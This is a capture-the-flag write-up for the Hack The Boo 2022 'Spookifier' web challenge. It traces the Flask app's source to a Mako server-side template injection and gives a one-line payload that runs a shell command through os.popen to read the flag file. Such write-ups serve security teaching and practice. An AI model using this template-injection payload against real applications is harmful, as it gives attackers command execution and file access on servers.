# Hack The Boo 2022

## Spookifier

> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?
>
>  Author: N/A
>
> [`web_spookifier.zip`](web_spookifier.zip)

Tags: _web_

## Preparation
The challenge provides a simple webpage that allows entering a name and converting the name to be written in *spooky* typo. Entering the username is the only real interaction one can do so this seems to be a good candidate for placing some kind of payload. Looking at the provided code the only endpoint available is ```/```

```python
@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
```

Which in turn calls ```spookify```

```python
def change_font(text_list):
        text_list = [*text_list]
        current_font = []
        all_fonts = []

        add_font_to_list = lambda text,font_type : (
                [current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
                ) and None

        add_font_to_list(text_list, 'font1')
        add_font_to_list(text_list, 'font2')
        add_font_to_list(text_list, 'font3')
        add_font_to_list(text_list, 'font4')

        return all_fonts

def spookify(text):
        converted_fonts = change_font(text_list=text)

        return generate_render(converted_fonts=converted_fonts)
```

The functions are merely looking up characters from some provided font arrays and replacing the original characters. Interesstingly the number of supported characters is small, most importantly *<* and *>* are not available canceling out *xxs* or *xxe* attacks. 

So futher inspecting the source code shows that the application uses Mako templates which allow injecting payloads, most notably payloads with access to the ```os``` module.

```python
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify
```

## Solution

Since the flag location is known by the provided materials, entering ```${self.module.cache.util.os.popen("cat ../flag.txt").read()}``` as name leads to the flag ```HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}```